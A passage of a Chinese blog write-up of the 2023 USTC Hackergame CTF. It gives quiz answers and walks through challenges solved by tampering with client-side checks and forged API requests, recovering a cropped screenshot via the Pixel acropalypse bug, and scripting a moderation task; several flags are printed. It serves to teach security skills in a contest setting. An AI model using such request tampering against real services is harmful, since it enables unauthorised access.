<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="CTF | 2023 USTC Hackergame WriteUp, MiaoTony,blog">
    <meta name="description" content="又是一年Hackergame，今年题目难度整体偏基础好入门，给这周增添了点娱乐气息，和往年一样比赛中也学到了许多。">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159946730-1"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag() {
        dataLayer.push(arguments);
    }

    gtag('js', new Date());
    gtag('config', 'UA-159946730-1');
</script>


    <title>CTF | 2023 USTC Hackergame WriteUp | MiaoTony&#39;s小窝</title>
    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">
	
    <script src="/libs/jquery/jquery.min.js"></script>
    <script>
        //来个特效玩玩喵 20200123
        var titleTime;
        var OriginTitile = document.title;
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                document.title = '|ω·) 喵~快回来呀！';
                clearTimeout(titleTime);
            } else {
                document.title = '(/≧▽≦)/ Meow！';
                titleTime = setTimeout(function() {
        	    document.title = OriginTitile;
        }, 800);
    }
        });
    </script>
<meta name="generator" content="Hexo 6.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="MiaoTony's小窝" type="application/atom+xml">
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">MiaoTony&#39;s小窝</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友链</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">MiaoTony&#39;s小窝</div>
        <div class="logo-desc">
            
            喵~欢迎各位大佬的来访呀！
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友链
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/miaotony" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Follow Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/miaotony" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Follow Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">CTF | 2023 USTC Hackergame WriteUp</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        min-width: 240px;
        padding-left: 15px;
        padding-bottom: 30px;
    }

    .toc-widget .toc-title {
        padding: 30px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
	    max-height: 450px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/CTF/">
                                <span class="chip bg-color">CTF</span>
                            </a>
                        
                            <a href="/tags/WriteUp/">
                                <span class="chip bg-color">WriteUp</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/CTF/" class="post-category">
                                CTF
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-11-05
                </div>
                

                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    19.8k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    82 分
                </div>
                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <p><img src="/2023/11/05/CTF_2023Hackergame/640-1.png"></p>
<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><blockquote>
<p><strong>中国科学技术大学第十届信息安全大赛</strong></p>
<p><strong>比赛时间：</strong>北京时间 2023 年 10 月 28 日 中午 12:00 ～ 11 月 04 日 中午 12:00（共七天）；<a target="_blank" rel="noopener" href="https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2023.10.28_Hackergame/files/hackergame2023.ics">添加到日历</a></p>
<p>为了让参赛的同学们更好地平衡学习和比赛，按照传统，我们将于 10 月 29 日（周日）晚 20:00 至 10 月 30 日（周一）早 8:00 期间关闭比赛平台。在此期间选手们可以好好休息，完成自己的作业，准备迎接新的一周。</p>
<p><strong>赛制：</strong> <strong>个人线上赛</strong>，解题模式，约 25 道题目，有实时排行榜。</p>
<p>比赛题目分为 5 类，分类如下：</p>
<ul>
<li>综合技能（general）</li>
<li>程序逆向与漏洞利用（binary）</li>
<li>密码学与数学（math）</li>
<li>网站安全（web）</li>
<li>人工智能（AI）</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://hack.lug.ustc.edu.cn/">https://hack.lug.ustc.edu.cn/</a></p>
</blockquote>
<p><strong>这周有啥娱乐活动？</strong></p>
<p><strong>噢，USTC hackergame！</strong></p>
<p>今年这段时间事情挺多，没啥时间来看题，特别是周末还花了点时间，<a target="_blank" rel="noopener" href="https://su-team.cn/passages/2023-10-28-ACTF/">和 SU 的队友打 XCTF 分站赛 ACTF 2023 去了</a>，最后打了个第二，队友好强！！！</p>
<p>hackergame 就只有几个晚上的时间简单瞄了下，但是怎么做着做着一晚上就过去了，特别是最后一晚上看着题目怎么就天亮了，顶不住顶不住，想睡大觉，呼呼~</p>
<p>这篇博客随便来记录一下解题过程，当然还有不少做题过程中看到的有意思的东西。</p>
<p><strong>希望大家看了也能有所收获！</strong></p>
<p><em><del>唉，搞科研搞学术有这么有意思就好了（想早日毕业跑路，呜呜</del></em></p>
<blockquote>
<p>顺便，喵喵往年的 Hackergame Writeup 回顾：</p>
<p><a href="https://miaotony.xyz/2022/10/30/CTF_2022Hackergame_0x01/">CTF | 2022 USTC Hackergame WriteUp 0x01</a></p>
<p><a href="https://miaotony.xyz/2021/11/03/CTF_2021Hackergame/">CTF | 2021 USTC Hackergame WriteUp</a></p>
<p><a href="https://miaotony.xyz/2020/11/08/CTF_2020Hackergame/">CTF | 2020 USTC Hackergame WriteUp</a></p>
</blockquote>
<h2 id="Hackergame-启动"><a href="#Hackergame-启动" class="headerlink" title="Hackergame 启动"></a>Hackergame 启动</h2><blockquote>
<p>大声喊出 Hackergame 启动，开始今年的冒险！</p>
<p>提示：完成题目遇到困难？你可以参考 <a target="_blank" rel="noopener" href="https://github.com/ustclug/hackergame2018-writeups/tree/master/official/qiandao">2018 年签到题题解</a>、<a target="_blank" rel="noopener" href="https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E7%AD%BE%E5%88%B0%E9%A2%98/README.md">2019 年签到题题解</a>、<a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/official/%E7%AD%BE%E5%88%B0/README.md">2020 年签到题题解</a>、<a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2021-writeups/blob/master/official/%E7%AD%BE%E5%88%B0/README.md">2021 年签到题题解</a> 和 <a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/official/%E7%AD%BE%E5%88%B0/README.md">2022 年签到题题解</a>。</p>
</blockquote>
<p>同样的前端 UI 缝缝补补继续用捏</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231028211546837.png"></p>
<p>发现是前端校验相似度然后发请求</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231028211521928.png"></p>
<p>直接 <code>/?similarity=100</code> 完事</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231028211451661.png"></p>
<p>最下面的是陆队名言！</p>
<h2 id="猫咪小测"><a href="#猫咪小测" class="headerlink" title="猫咪小测"></a>猫咪小测</h2><blockquote>
<p><img src="/2023/11/05/CTF_2023Hackergame/cat.webp" alt="不关橙猫猫的事喔"></p>
<p>注意看，这只可爱的橙猫猫叫小喵。</p>
<p>只要有阳光的地方就能见到它的身影，只要有鱼干的地方就能听到它的喵声。但今天的小喵有些不同，它的眼神充满了紧张与期待，因为一年一度的风云际会，大师喵主办的全校猫咪小测马上就要开始了。</p>
<p>「在科大，即使身为猫咪，也要兼备充分的科大常识、扎实的数理基础、以及独立的科研能力」大师喵蹲坐在主席台上，目光炯炯。</p>
<p>小喵乖巧地坐在课桌前，爪子紧按着用来答题的鼠标，似乎一松开鼠标就会自己溜走一样。</p>
<p>不得不承认，这场小测并不容易。</p>
<p>「生而为猫，我很抱歉」</p>
<p>后排传来了一声沮丧而近乎绝望的呜咽，应该是今年刚入校的少年喵。本就有着比众喵更小的年龄，其当年足可引以为傲的天赋在科大里却也算不上什么，于是每次测验都只能位居末流。</p>
<p>小喵还没来得及回头，大师喵「噌」地一下从讲台上腾跃而下，扑到后排那名猫咪的身前，用舌头细细梳理这名猫咪的后颈上的绒毛。</p>
<p>「不可以这样说哦，静心努力你也可以做出来的喵~」</p>
<p>啊，大师喵那一如既往的温柔。</p>
<p>少年喵非常感动。「嗯嗯我明白了。それなら別の言い方をしよう：猫として生まれて、すみません」</p>
<p>「给我好好做题（敲），不是要你换一种语言再说一遍啊（kusa）」</p>
<p>「不愧是大师喵」，小喵钦佩地望着大师喵的身影。</p>
<p>「这种说话还能带括号的技巧我也想学！」</p>
<p>提示：<strong>解出谜题不需要是科大在校猫咪</strong>。解题遇到困难？你可以参考以下题解：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/ustclug/hackergame2018-writeups/blob/master/official/ustcquiz/README.md">2018 年猫咪问答题解</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/official/%E7%8C%AB%E5%92%AA%E9%97%AE%E7%AD%94++/README.md">2020 年猫咪问答++ 题解</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2021-writeups/blob/master/official/%E7%8C%AB%E5%92%AA%E9%97%AE%E7%AD%94%20Pro%20Max/README.md">2021 年猫咪问答 Pro Max 题解</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/official/%E7%8C%AB%E5%92%AA%E9%97%AE%E7%AD%94%E5%96%B5/README.md">2022 年猫咪问答喵题解</a></li>
</ul>
</blockquote>
<p><em><del>（什么Z佬喵</del></em></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231028212846756.png"></p>
<blockquote>
<ol>
<li>想要借阅世界图书出版公司出版的《A Classical Introduction To Modern Number Theory 2nd ed.》，应当前往中国科学技术大学西区图书馆的哪一层？<strong>（30 分）</strong></li>
</ol>
<p>提示：是一个非负整数。</p>
</blockquote>
<p><strong>12</strong></p>
<p><a target="_blank" rel="noopener" href="https://lib.ustc.edu.cn/%e6%9c%ac%e9%a6%86%e6%a6%82%e5%86%b5/%e9%a6%86%e8%97%8f%e5%88%86%e5%b8%83/">https://lib.ustc.edu.cn/%e6%9c%ac%e9%a6%86%e6%a6%82%e5%86%b5/%e9%a6%86%e8%97%8f%e5%88%86%e5%b8%83/</a></p>
<p>馆藏分布</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231028212944522.png"></p>
<blockquote>
<ol start="2">
<li>今年 arXiv 网站的天体物理版块上有人发表了一篇关于「可观测宇宙中的鸡的密度上限」的论文，请问论文中作者计算出的鸡密度函数的上限为 10 的多少次方每立方秒差距？<strong>（30 分）</strong></li>
</ol>
<p>提示：是一个非负整数。</p>
</blockquote>
<p><strong>23</strong></p>
<p><a target="_blank" rel="noopener" href="https://arxiv.org/abs/2303.17626">https://arxiv.org/abs/2303.17626</a></p>
<blockquote>
<p>We find the most restrictive upper limit from the domains considered to be 10^23 pc^−3, which ruffles the feathers of long-standing astrophysics theory.     </p>
</blockquote>
<p>甚至 b乎 上还有一篇回答讲到了这篇论文：<a target="_blank" rel="noopener" href="https://www.zhihu.com/question/20337132/answer/3023506910">你见过哪些极品论文？</a></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231028213417723.png"></p>
<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/20337132/answer/3023506910">https://www.zhihu.com/question/20337132/answer/3023506910</a></p>
<blockquote>
<ol start="3">
<li>为了支持 TCP BBR 拥塞控制算法，在<strong>编译</strong> Linux 内核时应该配置好哪一条内核选项？<strong>（20 分）</strong></li>
</ol>
<p>提示：输入格式为 CONFIG_XXXXX，如 CONFIG_SCHED_SMT。</p>
</blockquote>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231028214226143.png"></p>
<p><strong><code>TCP_CONG_BBR</code></strong></p>
<blockquote>
<ol start="4">
<li>🥒🥒🥒：「我……从没觉得写类型标注有意思过」。在一篇论文中，作者给出了能够让 Python 的类型检查器 <del>MyPY</del> mypy 陷入死循环的代码，并证明 Python 的类型检查和停机问题一样困难。请问这篇论文发表在今年的哪个学术会议上？<strong>（20 分）</strong></li>
</ol>
<p>提示：会议的大写英文简称，比如 ISCA、CCS、ICML。</p>
</blockquote>
<p><strong>ECOOP</strong></p>
<p>google <code>paper mypy infinite loop</code></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231028214740997.png"></p>
<p>搜到论文 Python Type Hints Are Turing Complete，正好还是今年的</p>
<p><a target="_blank" rel="noopener" href="https://drops.dagstuhl.de/opus/volltexte/2023/18237/pdf/LIPIcs-ECOOP-2023-44.pdf">https://drops.dagstuhl.de/opus/volltexte/2023/18237/pdf/LIPIcs-ECOOP-2023-44.pdf</a></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231028214933713.png"></p>
<p><code>flag{WE1C0mE-To-aTT3nd-th3-n3k0-eX4M-2oz3}</code></p>
<p><code>flag{R3AL-maS7eR-Of-7HE-N3K0-EXaM-iN-u$7C}</code></p>
<h2 id="更深更暗"><a href="#更深更暗" class="headerlink" title="更深更暗"></a>更深更暗</h2><blockquote>
<p>小 E 正在收看电视新闻。</p>
<p>「诶，你知道吗，『泰坦』号潜水艇失事了！」小 E 对旁边的小 C 说。</p>
<p>小 C 凑近电视机，看了一眼新闻里的画面。</p>
<p>「是我眼花了吗？我刚刚有一瞬间好像在残骸上看到了一个 flag？」小 C 惊讶地说。</p>
<p>「玩 CTF 玩的。」小 E 对此不以为然，「一定是你看错了。」</p>
<p>小 C 却十分相信自己没有看错。</p>
</blockquote>
<p>前端根据 token 生成的 flag，直接执行就好</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231028212642603.png"></p>
<h2 id="赛博井字棋"><a href="#赛博井字棋" class="headerlink" title="赛博井字棋"></a>赛博井字棋</h2><blockquote>
<p>那一年的人机大战，是 AlphaGo 对阵柯洁，最终比分  3-0。当时我看见柯洁颓坐在椅子上泣不成声，这个画面我永生难忘。那一刻我在想，如果我能成为一名棋手，我一定要赢下人工智能。如今 AI  就在眼前，我必须考虑这会不会是我此生仅有的机会。重铸人类围棋荣光，我辈义不容辞！</p>
<p>……</p>
<p>但是围棋实在太难了，你决定先从井字棋开始练习。</p>
</blockquote>
<p>发现怎么玩都玩不过 AI，但是突然发现直接发请求过去，把棋子下到已经占用的位置上是可以把对面给吃了的，哈哈</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231028222742669.png"></p>
<h2 id="奶奶的睡前-flag-故事"><a href="#奶奶的睡前-flag-故事" class="headerlink" title="奶奶的睡前 flag 故事"></a>奶奶的睡前 flag 故事</h2><blockquote>
<blockquote>
<p>包含 AI 辅助创作</p>
</blockquote>
<p>（以下内容由 GPT 辅助编写，如有雷同纯属巧合）</p>
<p>晴空万里的假期终于拍了拍翅膀飞来了。对于一心想扔掉教材、砸掉闹钟、跃向世界的 L 同学来说，期待了整整三年的跨国旅游大业终于是时候启动了，还能巧妙地顺带着做个美满的老友记。</p>
<p>可是，哎哟喂，他刚踩上波光粼粼的金沙海滩，那他最疼爱的华为手机就跟着海风一起去约会了大海，连他的钱包也在这场未知探索之旅中神秘失踪。</p>
<p>「这个地方怎么连个华为手机都不卖。若是买个苹果手机，心疼的是它连个实体 SIM 卡槽都藏起来了，回国肯定成了个大摆设。不如来个<strong>谷歌的『亲儿子』</strong>？」L 同学踌躇满志地嘀咕道。</p>
<p>那时，像是上天的安排，「咱这儿正好有个<strong>谷歌『亲儿子』</strong>的老手机，你拿去逍遥吧」。</p>
<p>L 同学满眼星光地接过，<strong>连系统都没心思升级</strong>，就开始疯狂安装那个久闻大名的 GPT 程序，甚至雀跃地在群里晒出一张跟 GPT 对话的精彩<strong>截图</strong>，一时间成为了群里的焦点人物。</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/screenshot.png"></p>
<p>你能从这张图片里找到 flag 吗？</p>
</blockquote>
<p>那不就是今年3月份 Pixel 爆出来那个选择区域截图的时候没把原来图片多余 chunk 给删除掉的 bug 嘛</p>
<blockquote>
<p>Google Pixel 内置截图编辑器存在严重的隐私泄露bug。<br>当编辑截图时，编辑器仅仅覆盖原文件相应的区域而不是全部重写，另外由于裁剪过的图片一般小于原图片，于是原图片的部分数据还存留在文件里。</p>
<p><a target="_blank" rel="noopener" href="https://twitter.com/itssimontime/status/1636857478263750656">https://twitter.com/itssimontime/status/1636857478263750656</a></p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/infobyte/CVE-2023-21036">https://github.com/infobyte/CVE-2023-21036</a></p>
<p>这是个检测和消毒去除多余 chunk 的工具，不过顺便找到了个在线还原的工具</p>
<p>If you want to try to recover the original screenshots use <a target="_blank" rel="noopener" href="https://acropalypse.app/">https://acropalypse.app</a></p>
<p>设备选 Pixel 7 可以恢复</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231028220643916.png"></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/recover.png"></p>
<p><code>flag{sh1nj1ru_k0k0r0_4nata_m4h0}</code></p>
<h2 id="组委会模拟器"><a href="#组委会模拟器" class="headerlink" title="组委会模拟器"></a>组委会模拟器</h2><blockquote>
<p>每年比赛，组委会的一项重要工作就是时刻盯着群，并且撤回其中有 flag 的消息。今年因为人手紧张，组委会的某名同学将这项工作外包给了你，你需要连续审查 1000 条消息，准确无误地撤回其中所有含 flag 的消息，并且不撤回任何不含 flag 的消息。</p>
<p>本题中，你需要撤回的 “flag” 的格式为 <strong><code>hack[...]</code><strong>，其中</strong>方括号</strong>内均为小写英文字母，点击消息即可撤回。你需要在 3 秒内撤回消息，否则撤回操作将失败。在全部消息显示完成后等待几秒，如果你撤回的消息完全正确（撤回了全部需要撤回的消息，并且未将不需要撤回的消息撤回），就能获得本题<strong>真正的 flag</strong>。</p>
</blockquote>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231029020221384.png"></p>
<p>看起来会先 POST <a target="_blank" rel="noopener" href="http://202.38.93.111:10021/api/getMessages">http://202.38.93.111:10021/api/getMessages</a> 这个接口然后拿到消息以及对应的延迟</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231029020257107.png"></p>
<p>删除消息的话 </p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/api/deleteMessage</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">202.38.93.111:10021</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">10</span></span>
<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://202.38.93.111:10021</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://202.38.93.111:10021/</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">...</span></span>
<span class="token application-json">
<span class="token punctuation">{</span><span class="token string-property property">"id"</span><span class="token operator">:</span><span class="token number">345</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最后调用 </p>
<p>POST <a target="_blank" rel="noopener" href="http://202.38.93.111:10021/api/getflag">http://202.38.93.111:10021/api/getflag</a></p>
<p>来拿 flag</p>
<p>写个脚本一把梭</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> re
<span class="token keyword">import</span> time


cookies <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'session'</span><span class="token punctuation">:</span> <span class="token string">'ey...'</span>
<span class="token punctuation">}</span>

headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0'</span><span class="token punctuation">,</span>
    <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'application/json, text/plain, */*'</span><span class="token punctuation">,</span>
    <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span><span class="token punctuation">,</span>
